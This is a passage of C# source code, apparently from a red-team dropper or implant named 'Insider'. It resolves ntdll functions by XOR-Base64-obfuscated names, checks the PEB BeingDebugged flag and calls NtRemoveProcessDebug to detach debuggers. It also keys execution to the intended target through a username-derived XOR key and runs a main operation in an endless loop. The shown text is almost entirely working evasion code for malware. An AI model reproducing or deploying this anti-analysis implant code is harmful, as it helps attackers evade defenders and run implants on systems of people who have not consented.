				IntPtr funcaddr7 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(ntq)));
				NtQIP ntqip = (NtQIP)Marshal.GetDelegateForFunctionPointer(funcaddr7, typeof(NtQIP));

				ntqip(
				phandle,
				0,
				processInformation,         // -> [out]     =>  returns processInformation
				processInformationLength,
				ref returnLength
				);


				// https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess#parameters
				// https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=net-6.0#system-runtime-interopservices-marshal-ptrtostructure(system-intptr-system-type)
				
				// link flow chart: https://drive.google.com/file/d/1YbsUp71Dwp_CYZoU8d4QYvneU4kP_c8X/view
				// returns: object type -> needs typecasting
				PROCESS_BASIC_INFORMATION pbi = (PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(PROCESS_BASIC_INFORMATION));

				// Getting the base address of the PEB structure of our current process
				// According to https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb:
				// Baseaddress of PEB + 2 byte (RVA) = Absolute address of the BeingDebugged member of the PEB structure
				
				// Getting base address of PEB
				IntPtr Pebptr = pbi.PebAddress;
				
				// Getting absolute address of BeingDebugged member of the PEB structure
				// link: https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.readbyte?view=net-6.0#system-runtime-interopservices-marshal-readbyte(system-intptr)
				byte check = Marshal.ReadByte(Pebptr+2);

				if (check.Equals(1))
				{
					Console.Write("\n[!] Status: Implant is attached to a Debugger\t");

					//Detaching our implant from attached debugger
					// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FDebugObject%2FNtRemoveProcessDebug.html


					// https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
					IntPtr debuggerhandle = IntPtr.Zero;

					uint outlength = 0;

					/*
					// PInvoke
					NtQueryInformationProcess(
					phandle,
					0x1e,               // ProcessDebugObjectHandle = 0x1E
					ref debuggerhandle,
					8,          // 64bit => 8byte
					ref outlength
					);
					*/

					// delegate
					//IntPtr funcaddr8 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

					IntPtr funcaddr8 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(ntq)));
					NtQIP2 ntqip2 = (NtQIP2)Marshal.GetDelegateForFunctionPointer(funcaddr8, typeof(NtQIP2));

					ntqip2(
					phandle,
					0x1e,               // ProcessDebugObjectHandle = 0x1E
					ref debuggerhandle,
					8,          // 64bit => 8byte
					ref outlength
					);


					Console.WriteLine("-> Debug handle: {0}", debuggerhandle);

					Console.Write("[*] Trying to detach Debugger : ");
					//calling NtRemoveProcessDebug for Detaching debugger from implant process
					// PInvoke
					//int status = NtRemoveProcessDebug(phandle, debuggerhandle);

					// delegate
					//IntPtr funcaddr9 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRemoveProcessDebug");

					string str_ntrpd = "PBEkAAMIRlVnAAoVAB0UdFVVBwI="; // Xor-Base64(NtRemoveProcessDebug)

					IntPtr funcaddr9 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(XOR_B64_Decrypt(nt))), Encoding.UTF8.GetString(XOR_B64_Decrypt(str_ntrpd)));
					NtRPD ntrpd = (NtRPD)Marshal.GetDelegateForFunctionPointer(funcaddr9, typeof(NtRPD));

					int status = ntrpd(phandle, debuggerhandle);

					if (status == 0)
					{
						Console.WriteLine("[DONE!]");
					}
					else
					{
						Console.WriteLine("[Oops! Unable to detach...]");
					}
				}   
			}

			// Checking whether target machine is intended target machine or not.
			public static void CheckTarget()
			{
				// Using just testing string to perform the checking of xor key,
				// Whether xorkey(username) used by dropper is same as xorkey that 
				// Operator used while making the test string encrypted.
				string testontarget = "BgAFEQEJRFFFFQAC"; // Xor-Base64(testontarget)  

				string decoded = Encoding.UTF8.GetString(XOR_B64_Decrypt(testontarget));

				// Not matching
				if (!String.Equals(decoded,"testontarget"))
				{
					Console.WriteLine("\n[!] Not a valid Target!\tStopping Execution of this dropper...");
					System.Environment.Exit(1);
				}
				else
				{
					Console.WriteLine("\n[+] Valid Target Test: [Successfully Passed]\n[*] Starting execution of Insider...");
				}
			}

			static void Main()
			{
				// Checking whether target windows machine is intended target or out of scope/engagement
				CheckTarget();

				bool check = IsAdministrator();
				if (check.Equals("true"))
				{
					Console.WriteLine("\n[+] [ Current user is Admininstrator! ]");
				}
				else
				{
					Console.WriteLine("\n[+] [ Current user is Not Admininstrator => Privilege Escalation is needed! ]");
				}
				CheckDebugger();

				while(true)
				{
					MainOperation();
				}
			}
		}
	}
}
